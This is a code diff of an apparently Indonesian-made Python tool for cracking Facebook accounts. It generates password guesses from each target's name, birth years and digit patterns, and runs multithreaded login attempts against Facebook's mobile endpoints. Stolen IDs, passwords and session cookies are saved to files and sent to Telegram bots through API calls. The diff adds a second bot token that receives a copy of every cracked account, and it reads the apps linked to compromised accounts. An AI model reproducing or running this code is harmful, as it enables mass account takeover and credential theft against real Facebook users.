+	with tred(max_workers=30) as pool:
+		for yuzong in id2:
+			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+			frs = nmf.split(' ')[0]
+			pwv = []
+			if len(nmf)<6:
+				if len(frs)<3:
+					pass
+				else:
+					pwv.append(nmf)
+					pwv.append(frs + frs)
+					pwv.append(frs +' '+frs)
+					pwv.append('first last')
+					pwv.append('firstlast')
+					pwv.append(frs + '1234')
+					pwv.append('123'+frs)
+					pwv.append('1234'+frs)
+					pwv.append(frs + '123456')
+					pwv.append(frs + '12')
+					pwv.append(frs + '123')
+					pwv.append(frs + '2021')
+					pwv.append(frs + '2022')
+					pwv.append(frs + '2020')
+					pwv.append(frs + '2005')
+					pwv.append(frs + '2004')
+					pwv.append(frs + '2003')
+					pwv.append(frs + '2002')
+					pwv.append(frs + '2001')
+					pwv.append(frs + '2000')
+					pwv.append(frs + '2006')
+					pwv.append(frs + '2007')
+					pwv.append(frs + '1999')
+					pwv.append(frs + '1995')
+					pwv.append(frs + '1998')
+					pwv.append(frs + '1997')
+					pwv.append(frs + '1212')
+					pwv.append('19941994')
+					pwv.append('19991999')
+					pwv.append('19971997')
+					pwv.append('19961996')
+					pwv.append('19951995')
+					pwv.append('19931993')
+					pwv.append('19921992')
+					pwv.append('19981998')
+					pwv.append('20012001')
+					pwv.append('20002000')
+					pwv.append('20022002')
+					pwv.append('20032003')
+					pwv.append('20042004')
+					pwv.append('20052005')
+					pwv.append('20202020')
+					
+					
+			else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(nmf)
+					pwv.append(frs + frs)
+					pwv.append(frs +' '+frs)
+					pwv.append('first last')
+					pwv.append('firstlast')
+					pwv.append(frs + '1234')
+					pwv.append(frs + '123456')
+					pwv.append(frs + '12')
+					pwv.append(frs + '123')
+					pwv.append(frs + '2021')
+					pwv.append(frs + '2022')
+					pwv.append(frs + '2020')
+					pwv.append(frs + '2005')
+					pwv.append(frs + '2004')
+					pwv.append(frs + '2003')
+					pwv.append(frs + '2002')
+					pwv.append(frs + '2001')
+					pwv.append(frs + '2000')
+					pwv.append(frs + '2006')
+					pwv.append(frs + '1994')
+					pwv.append(frs + '2008')
+					pwv.append(frs + '2007')
+					pwv.append(frs + '1999')
+					pwv.append(frs + '1995')
+					pwv.append(frs + '1988')
+					pwv.append(frs + '1989')
+					pwv.append(frs + '1990')
+					pwv.append(frs + '1991')
+					pwv.append(frs + '1992')
+					pwv.append(frs + '1993')
+					pwv.append(frs + '1998')
+					pwv.append(frs + '1997')
+					pwv.append(frs + '1212')
+					pwv.append(frs+'123'+frs)
+					pwv.append(frs+'1234'+frs)
+					pwv.append('123'+frs)
+					pwv.append('1234'+frs)
+					pwv.append('12345'+frs)
+					pwv.append('123456'+frs)
+					pwv.append('19941994')
+					pwv.append('19991999')
+					pwv.append('19981998')
+					pwv.append('123456123456')
+					pwv.append('1122334455')
+					pwv.append('20012001')
+					pwv.append('20002000')
+					pwv.append('20022002')
+					pwv.append('20032003')
+					pwv.append('20042004')
+					pwv.append('20052005')
+					pwv.append('20202020')
+					pwv.append('20232023')
+					pwv.append('20222022')
+			if 'ya' in pwpluss:
+				for xpwd in pwnya:
+					pwv.append(xpwd)
+			else:pass
+			if 'mobile' in method:
+				pool.submit(crack,idf,pwv)
+			elif 'free' in method:
+				pool.submit(crackfree,idf,pwv)
+			elif 'touch' in method:
+				pool.submit(cracktouch,idf,pwv)
+			elif 'mbasic' in method:
+				pool.submit(crackmbasic,idf,pwv)
+			else:
+				pool.submit(crackmbasic,idf,pwv)
+	print('')
+	cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
+	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
+	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
+	print('')
+	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
+	woi = input('>> Pilih : ')
+	if woi in ['y','Y']:
+		back()
+	else:
+		print(f'\t{x}[=]{k} Been completed {x} <> ')
+		time.sleep(2)
+		exit()
+		
 
-    SDMi('')
-    cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
-    SDMi(f'''[{b}•{x}]{h} OK : {h}%s ''' % ok)
-    SDMi(f'''{x}[{b}•{x}]{k} CP : {k}%s{x} ''' % cp)
-    SDMi('')
-    SDMi('>> Lanjut Crack Kembali ( Y/t ) ? ')
-    woi = input('>> Pilih : ')
-    if woi in ('y', 'Y'):
-        back()
-    else:
-        SDMi(f'''\t{x}[=]{k} Been completed {x} <> ''')
-        time.sleep(2)
-        exit()
 
-
-def crack(idf, pwv):
+def crack(idf,pwv):
 	global loop,ok,cp
-	bo = random.choice([u,k,kk,b,h,hh])
-	rc = random.choice
-	amr = rc(['😀','🚬'])
-	sys.stdout.write(f"\r{bo}(𖠠[𝙼𝙸𝙼𝙾 𝐕𝐈𝐏]  {loop}•{len(id)}  •  [ 𝐎𝐊 ] :{ok} •  [𝐶𝑃] -:{cp} • ({'{:.0%}'.format(loop/float(len(id)))}{amr})"),
-	sys.stdout.flush()
+	bi = random.choice([u,k,kk,b,h,hh])
+	pers = loop*100/len(id2)
+	fff = '%'
+	print('\r%s [𝙼𝙸𝙼𝙾 𝐕𝐈𝐏] %s/%s || [ 𝐎𝐊 ] - %s || [𝐶𝑃] - %s || %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
@@ -992,7 +885,7 @@ def crack(idf, pwv):
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 				else:
-					SDMi('\n')
+					print('\n')
 					statuscp = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✖️
 ⋘─────━𓆩مدفوع𓆪‏━─────⋙
 ❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
@@ -1006,6 +899,7 @@ BY = @mx1mq |'''
 					akun.append(idf+'|'+pw)
 					cp+=1
 					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))
+					requests.get("https://api.telegram.org/bot"+str(token1)+"/sendMessage?chat_id="+str(ID1)+"&text="+str(statuscp))
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				headapp={"user-agent":"NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
@@ -1014,7 +908,7 @@ BY = @mx1mq |'''
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
-					SDMi('\n')
+					print('\n')
 					statusok = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✔️
 ⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙
 ❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
@@ -1022,9 +916,9 @@ BY = @mx1mq |'''
 ⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙
 BY = @mx1mq'''
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='OK'))
+					cetak(nel(statusok1, title=' NO SESI'))
 					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-					cek_SDMVIP(kuki)
+					requests.get("https://api.telegram.org/bot"+str(token1)+"/sendMessage?chat_id="+str(ID1)+"&text="+str(statusok))
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1063,6 +957,7 @@ BY = @mx1mq'''
 ⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙
 BY = @mx1mq '''
 					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
+					requests.get("https://api.telegram.org/bot"+str(token1)+"/sendMessage?chat_id="+str(ID1)+"&text="+str(infoakun))
 
 					hit1, hit2 = 0,0
 					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
@@ -1091,32 +986,23 @@ BY = @mx1mq '''
 								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
 								hit2+=1
 					else:pass
-					SDMi('\n')
-					statusok = f'''
-——————————————
-• DeCoDe By @H_S_W_M •
-——————————————
-▄︻デ══━一 «𝗢𝗞 شـغال ࿐» ⏎
-⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
- (𝑆 𝐷 𝑀) જ⁀➴  - 𝐈𝐃 𖡲 : {idf}\n
- 
-(𝑆 𝐷 𝑀) જ⁀➴  - 𝗣𝗔𝗦𝗦 ッ  :{pw}
-
-(𝑆 𝐷 𝑀) જ⁀➴  - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 ッ :{kuki}
-⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
-(♕) نـمࢪود 𝑆 𝐷 𝑀 𖣬 :『@M_T_F 』⏎'''
+					print('\n')
+					statusok = f'''					
+   \n{infoakun}					
+					'''
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='OK'))
-					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-					cek_SDMVIP(kuki)
+					#requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+					cek_RMAD(kuki)
 					break
+
+
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
 			time.sleep(31)
 	loop+=1
-
-def cek_SDMVIP(kuki):
+def cek_RMAD(kuki):
 	session = requests.Session()
 	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
 	sop = bs4.BeautifulSoup(w,"html.parser")
@@ -1124,18 +1010,33 @@ def cek_SDMVIP(kuki):
 	game = [i.text for i in x.find_all("h3")]
 	try:
 		for i in range(len(game)):
-			SDMi ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
+			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
 	except AttributeError:
-		SDMi ("\r    %s\033[0m cookie invalid"%(M))
+		print ("\r    %s\033[0m cookie invalid"%(M))
 	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
 	sop = bs4.BeautifulSoup(w,"html.parser")
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
 	try:
 		for i in range(len(game)):
-			SDMi ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
-	except AttributeError:	 
-		SDMi ("\r    %s \033[0mcookie invalid"%(M))
+			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
+	except AttributeError:
+		print ("\r    %s \033[0mcookie invalid"%(M))
+def O():
+	try:
+		os.remove('ID.txt')
+		os.remove('ok.coki.txt')
+		os.remove('.token.txt')
+		os.remove('.cok.txt')
+		
+	except FileNotFoundError as error:
+		
+		
+		exit()
+		
+		
+
+#-----------------------[ 𝙼𝙸𝙼𝙾 ]--------------------#
 if __name__=='__main__':
 	try:os.system('git pull')
 	except:pass
@@ -1143,12 +1044,13 @@ if __name__=='__main__':
 	except:pass
 	try:os.mkdir('CP')
 	except:pass
-	try:os.mkdir('/sdcard/heroes-DUMP')
+	try:os.mkdir('/sdcard/ALVINO-DUMP')
 	except:pass
 	try:os.system('touch .prox.txt')
 	except:pass
 	try:os.system('pkg install play-audio')
 	except:pass
 	try:os.system('clear')
-	except:pass	
-	SDM()
+	except:pass
+	
+	Login()
